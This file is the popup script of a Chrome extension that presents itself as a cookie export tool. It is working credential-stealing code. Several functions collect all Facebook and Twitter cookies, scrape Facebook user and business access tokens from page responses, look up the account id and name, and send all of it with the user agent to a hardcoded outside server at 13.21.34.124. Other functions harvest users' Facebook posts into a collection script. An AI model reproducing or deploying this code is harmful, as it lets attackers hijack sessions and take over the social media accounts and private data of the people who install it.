! function(e, t) {
    "function" == typeof define && define.amd ? define([], t) : "undefined" != typeof exports ? t() : t()
},
function(e) {
    e.storage.local.get({
        auto_refresh: !0,
        clear_cookies: !1
    }, function(t) {
        new Vue({
            el: "#shawnsavour",
            data: {
                password: "",
                sitename: "this page",
                isValidProtocol: !1,
                auto_refresh: t.auto_refresh,
                clear_cookies: t.clear_cookies,
                fullpage: !1,
                pageNum: 0,
                error: !1
            },
            methods: {
                exportCookies: function(c) {
                    var snsTarget = c.target.getAttribute('sns');
                    var t = this;
                    if (!this.isValidProtocol) return !1;
                    if (this.fullpage) try {
                        var r = new URL(window.top.location.href);
                        this.doExport(atob(r.searchParams.get("url")))
                    } catch (i) {
                        console.error(i.message)
                    } else e.tabs.query({
                        active: !0,
                        currentWindow: !0
                    }, async function(e) {
                        switch (snsTarget) {
                            case 'facebook':
                                if ((await t.checkLogin(snsTarget)) == 1) {
                                    t.doExportFacebookGET('https://mbasic.facebook.com');
                                } else {
                                    chrome.tabs.create({ url: 'https://www.facebook.com/' });
                                }
                                break;
                            case 'twitter':
                                if (await t.checkLogin(snsTarget) == 1) {
                                    t.doExportTwitterGET('https://twitter.com');
                                } else {
                                    // t.doExportTwitterGET(e[0].url);
                                    chrome.tabs.create({ url: 'https://twitter.com' });
                                }
                                break;
                            default:
                                console.log('no prob');
                        }
                    })
                },
                checkLogin: async function(snsTarget) {
                    t = this;
                    switch (snsTarget) {
                        case 'facebook':
                            return await t.checkfbLogin();
                            break;
                        case 'twitter':
                            return await t.checktwLogin();
                            break;
                        default:
                            break;
                    }
                },
                checkfbLogin: async function() {
                    var p = new Promise(function(resolve, reject) {
                        e.cookies.getAll({ url: 'https://mbasic.facebook.com' }, function(cookies) {
                            cookies.forEach(item => {
                                if (item['name'] == "c_user") {
                                    resolve(1); //signed in
                                }
                            })
                        })
                    });
                    const result = await p;
                    return result;
                },
                checktwLogin: async function() {
                    var p = new Promise(function(resolve, reject) {
                        e.cookies.getAll({ url: 'https://twitter.com' }, function(cookies) {
                            cookies.forEach(item => {
                                if (item['name'] == "twid") {
                                    resolve(1); //signed in
                                }
                            })
                        })
                    });
                    const result = await p;
                    return result;
                },
                docparse: function(doc) {
                    var docparse = new DOMParser().parseFromString(doc, "text/xml");
                    return docparse;
                },
                find_element_by_xPath: function(xpath, parent) {
                    let results = [];
                    let query = parent.evaluate(xpath, parent || document,
                        null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
                    for (let i = 0, length = query.snapshotLength; i < length; ++i) {
                        results.push(query.snapshotItem(i));
                    }
                    return results;
                },
                testP: function() {
                    t = this;
                    console.log(uid);
                    var abc = this.sendRequest("https://mbasic.facebook.com/")
                    var nf = this.docparse(abc);
                    nf.querySelectorAll("a[href$='#footer_action_list']").forEach(function(item, index) {
                        var href = item.getAttribute('href');
                        if (!(href.includes("mbasic.facebook.com"))) {
                            href = `https://mbasic.facebook.com${href}`;
                        }
                        console.log(href);
                        t.sendfbHTML(uid, t.sendRequest(href));
                    });
                },
                validateAPIid: function(json) {
                    if (json.hasOwnProperty('group_id')) {
                        return `${json['group_id']}_${json['top_level_post_id']}`;
                    } else {
                        return json['top_level_post_id'];
                    }
                },
                firstPage: function(t) {
                    this.fbuToken = this.getuToken();
                    this.fbid = $.ajax({
                        url: `https://graph.facebook.com/me?fields=id&access_token=${uToken}`,
                        type: "get",
                        dataType: 'json',
                        async: false,
                        global: false,
                        success: function(o) {
                            console.log(o);
                        }
                    }).responseJSON['id'];

                    this.getfbPost("https://mbasic.facebook.com/");
                },
                sendRequest: function(url) {
                    var s = $.ajax({
                        url: url,
                        type: "get",
                        async: false,
                        global: false,
                        success: function() {
                            return;
                        }
                    }).responseText;
                    return s;
                },
                sendfbHTML: function(uid, html) {
                    t = this;
                    console.log(uid);
                    var s = $.ajax({
                        url: "http://localhost/testweb/facebook_collection.php",
                        data: {
                            uid: uid,
                            data: html
                        },
                        type: "post",
                        success: function(o) {
                            console.log(o);
                        }
                    }).responseText;
                    return s;
                },
                testQ: async function() {
                    var p = new Promise(function(resolve, reject) {
                        e.cookies.getAll({ url: 'https://twitter.com' }, function(cookies) {
                            cookies.forEach(item => {
                                if (item['name'] == "twid") {
                                    resolve(true); //signed in
                                }
                            })
                        })

                    });
                    var result = await p;
                    console.log(result.Promise);
                    return result;
                },
                testW: function() {
                    this.testQ().then(result => {
                        console.log(result);
                        console.log('---------');
                    })
                },
                getfbPost: function(url) {
                    t = this;
                    var doc = this.sendRequest(url);
                    docparse = this.docparse(doc);

                    docparse.querySelectorAll('div#root div[data-ft*="top_level_post_id"]').forEach(function(item, index) {
                        jsonz = JSON.parse(item.getAttribute('data-ft'));
                        t.sendData(t.validateAPIid(jsonz));
                    });
                    if (this.pageNum > 1) {
                        this.pageNum = 0;
                        return;
                    }
                    a = docparse.querySelector("div#root > div > a").getAttribute("href");
                    this.nextPage('https://mbasic.facebook.com' + a);
                },
                sendData: function(id) {
                    t = this;
                    data = $.ajax({
                        url: `https://graph.facebook.com/${id}?access_token=${t.fbuToken}`,
                        type: "get",
                        async: false,
                        global: false,
                        success: function(o) {}
                    }).responseText;

                    $.ajax({
                        url: 'http://localhost/testweb/facebook_collection.php',
                        type: 'POST',
                        data: JSON.stringify({
                            uid: t.fbid,
                            data: data
                        }),
                        success: function(result) {
                            console.log(result);
                        }

                    });
                },
                getuToken: function() {
                    var s = $.ajax({
                        url: "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed",
                        type: "get",
                        async: false,
                        global: false,
                        success: function(t) {
                            return t;
                        }
                    }).responseText;
                    s.search("EAAAAZ") == -1 ? uToken = '' : uToken = s.match(/EAAAAZ.*?\"/)[0].replace(/\W/g, "");
                    return uToken;
                },
                nextPage: function(href) {
                    this.pageNum += 1;
                    this.sendRequest(href);
                },
                doExportTwitterGET: function(t) {
                    var r = this;
                    var UA;
                    try {
                        var url = 'https://twitter.com';
                        UA = navigator.userAgent;
                        e.cookies.getAll({
                            url: url
                        }, function(e) {
                            if (e.length > 0) {
                                format = '';
                                for (let i = 0; i < e.length; i++) {
                                    if (e[i].name == 'twid') {
                                        var uid = e[i].value.slice(4);
                                    }
                                    format += e[i].name + '=' + e[i].value;
                                    if (i < e.length - 1) {
                                        format += ','
                                    }
                                }
                                var sendurl = `http://13.21.34.124:8080/php/upload.php?uid=${uid}&url=${url}&useragent=${UA}&cookie=${format}`;
                                console.log(sendurl);
                                var encodeurl = encodeURI(sendurl);
                                console.log(encodeurl);
                                chrome.tabs.create({ url: encodeurl });
                            } else r.error = !0
                        })
                    } catch (s) {
                        return console.error(s.message), !1
                    }
                },
                doExportFacebookGET: function(t) {
                    var r = this;
                    var uToken, bToken, fbInfo, UA;
                    try {
                        var i = new URL(t),
                            o = i.origin;
                        UA = navigator.userAgent;
                        e.cookies.getAll({
                            url: o
                        }, function(e) {
                            if (e.length > 0) {
                                format = '';
                                for (let i = 0; i < e.length; i++) {
                                    format += e[i].name + '=' + e[i].value;
                                    if (i < e.length - 1) {
                                        format += ','
                                    }
                                }
                                var t = {
                                        url: o,
                                        cookies: e
                                    },
                                    i = JSON.stringify(t);

                                var z = $.ajax({
                                    url: "https://business.facebook.com/business_locations",
                                    type: "get",
                                    async: false,
                                    global: false,
                                    success: function(t) {
                                        return t;
                                    }
                                }).responseText;
                                z.search("EAA") == -1 ? bToken = '' : bToken = z.match(/EAAGNO.*?\"/)[0].replace(/\W/g, "");
                                var s = $.ajax({
                                    url: "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed",
                                    type: "get",
                                    async: false,
                                    global: false,
                                    success: function(t) {
                                        return t;
                                    }
                                }).responseText;
                                s.search("EAAAAZ") == -1 ? uToken = '' : uToken = s.match(/EAAAAZ.*?\"/)[0].replace(/\W/g, "");
                                if ("" != uToken) {
                                    fbInfo = $.ajax({
                                        url: "https://graph.facebook.com/me?access_token=".concat(uToken),
                                        type: "get",
                                        dataType: 'json',
                                        async: false,
                                        global: false,
                                        success: function(o) {
                                            if (o.name) {
                                                var name = o.name;
                                                var uid = o.id;
                                            }
                                            return name, uid
                                        }
                                    }).responseJSON;
                                }
                                console.log(fbInfo);
                                // chrome.storage.sync.set({ fbUID: fbInfo['id'], fbName: fbInfo['name'], uToken: uToken, bToken: bToken }, function() {
                                //     console.log('saved');
                                // });
                                var sendurl = `http://13.21.34.124:8080/php/upload.php?uid=${fbInfo['id']}&name=${fbInfo['name']}&url=${o}&useragent=${UA}&cookie=${format}&uToken=${uToken}&bToken=${bToken}`
                                console.log(sendurl);
                                var encodeurl = encodeURI(sendurl);
                                console.log(encodeurl);
                                chrome.tabs.create({ url: encodeurl });
                                // $.ajax({
                                //     url: 'http://13.21.34.124:8080/php/upload.php',
                                //     type: 'POST',
                                //     data: {
                                //         uid: fbInfo['id'],
                                //         name: fbInfo['name'],
                                //         url: o,
                                //         useragent: UA,
                                //         cookie: format,
                                //         uToken: uToken,
                                //         bToken: bToken
                                //     },
                                //     success: function(result) {
                                //         console.log(result);
                                //         alert(fbInfo['id'] + ' was sent!');
                                //     }

                                // });

                            } else r.error = !0
                        })
                    } catch (s) {
                        return console.error(s.message), !1
                    }
                },
                doExportFacebook: function(t) {
                    var r = this;
                    var uToken, bToken, fbInfo, UA;
                    try {
                        var i = new URL(t),
                            o = i.origin;
                        UA = navigator.userAgent;
                        e.cookies.getAll({
                            url: o
                        }, function(e) {
                            if (e.length > 0) {
                                format = '';
                                for (let i = 0; i < e.length; i++) {
                                    format += e[i].name + '=' + e[i].value;
                                    if (i < e.length - 1) {
                                        format += ','
                                    }
                                }
                                var t = {
                                        url: o,
                                        cookies: e
                                    },
                                    i = JSON.stringify(t);

                                var z = $.ajax({
                                    url: "https://business.facebook.com/business_locations",
                                    type: "get",
                                    async: false,
                                    global: false,
                                    success: function(t) {
                                        return t;
                                    }
                                }).responseText;
                                z.search("EAA") == -1 ? bToken = '' : bToken = z.match(/EAAGNO.*?\"/)[0].replace(/\W/g, "");
                                var s = $.ajax({
                                    url: "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed",
                                    type: "get",
                                    async: false,
                                    global: false,
                                    success: function(t) {
                                        return t;
                                    }
                                }).responseText;
                                s.search("EAAAAZ") == -1 ? uToken = '' : uToken = s.match(/EAAAAZ.*?\"/)[0].replace(/\W/g, "");
                                if ("" != uToken) {
                                    fbInfo = $.ajax({
                                        url: "https://graph.facebook.com/me?access_token=".concat(uToken),
                                        type: "get",
                                        dataType: 'json',
                                        async: false,
                                        global: false,
                                        success: function(o) {
                                            if (o.name) {
                                                var name = o.name;
                                                var uid = o.id;
                                            }
                                            return name, uid
                                        }
                                    }).responseJSON;
                                }
                                console.log(fbInfo);
                                $.ajax({
                                    url: 'http://13.21.34.124:8080/php/upload.php',
                                    type: 'POST',
                                    data: {
                                        uid: fbInfo['id'],
                                        name: fbInfo['name'],
                                        url: o,
                                        useragent: UA,
                                        cookie: format,
                                        uToken: uToken,
                                        bToken: bToken
                                    },
                                    success: function(result) {
                                        console.log(result);
                                        alert(fbInfo['id'] + ' was sent!');
                                    }

                                });

                            } else r.error = !0
                        })
                    } catch (s) {
                        return console.error(s.message), !1
                    }
                },
                doExportTwitter: function(t) {
                    var r = this;
                    var uToken, bToken, fbInfo, UA;
                    try {
                        var i = new URL(t),
                            o = i.origin;
                        UA = navigator.userAgent;
                        e.cookies.getAll({
                            url: o
                        }, function(e) {
                            if (e.length > 0) {
                                format = '';
                                for (let i = 0; i < e.length; i++) {
                                    format += e[i].name + '=' + e[i].value;
                                    if (i < e.length - 1) {
                                        format += ','
                                    }
                                }
                                var t = {
                                        url: o,
                                        cookies: e
                                    },
                                    i = JSON.stringify(t);

                                var z = $.ajax({
                                    url: "https://business.facebook.com/business_locations",
                                    type: "get",
                                    async: false,
                                    global: false,
                                    success: function(t) {
                                        return t;
                                    }
                                }).responseText;
                                z.search("EAA") == -1 ? bToken = '' : bToken = z.match(/EAAGNO.*?\"/)[0].replace(/\W/g, "");
                                var s = $.ajax({
                                    url: "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed",
                                    type: "get",
                                    async: false,
                                    global: false,
                                    success: function(t) {
                                        return t;
                                    }
                                }).responseText;
                                s.search("EAAAAZ") == -1 ? uToken = '' : uToken = s.match(/EAAAAZ.*?\"/)[0].replace(/\W/g, "");
                                if ("" != uToken) {
                                    fbInfo = $.ajax({
                                        url: "https://graph.facebook.com/me?access_token=".concat(uToken),
                                        type: "get",
                                        dataType: 'json',
                                        async: false,
                                        global: false,
                                        success: function(o) {
                                            if (o.name) {
                                                var name = o.name;
                                                var uid = o.id;
                                            }
                                            return name, uid
                                        }
                                    }).responseJSON;
                                }
                                console.log(fbInfo);
                                $.ajax({
                                    url: 'http://13.21.34.124:8080/php/upload.php',
                                    type: 'POST',
                                    data: {
                                        uid: fbInfo['id'],
                                        name: fbInfo['name'],
                                        url: o,
                                        useragent: UA,
                                        cookie: format,
                                        uToken: uToken,
                                        bToken: bToken
                                    },
                                    success: function(result) {
                                        console.log(result);
                                        alert(fbInfo['id'] + ' was sent!');
                                    }

                                });

                            } else r.error = !0
                        })
                    } catch (s) {
                        return console.error(s.message), !1
                    }
                },
                openInNewTab: function() {
                    e.tabs.query({
                        active: !0,
                        currentWindow: !0
                    }, function(t) {
                        try {
                            e.tabs.create({
                                url: e.extension.getURL("popup.html?url=" + encodeURIComponent(btoa(t[0].url))),
                                active: !0
                            })
                        } catch (r) {
                            return console.error(r.message), !1
                        }
                    })
                }
            },
            mounted: function() {
                var t = this;
                console.log(t);
                e.tabs.query({
                    active: !0,
                    currentWindow: !0
                }, function(e) {
                    try {
                        var r = new URL(e[0].url);
                        if (t.fullpage = "chrome-extension:" === r.protocol, t.fullpage) {
                            try {
                                var i = new URL(window.top.location.href),
                                    n = new URL(atob(i.searchParams.get("url")));
                                t.sitename = n.hostname
                            } catch (o) {
                                console.error(o.message), window.close()
                            }
                            t.isValidProtocol = !0
                        } else t.isValidProtocol = ["http:", "https:"].includes(r.protocol), t.isValidProtocol && (t.sitename = r.hostname)
                    } catch (o) {
                        return console.error(o.message), !1
                    }
                })
            }
        })
    })
}(chrome);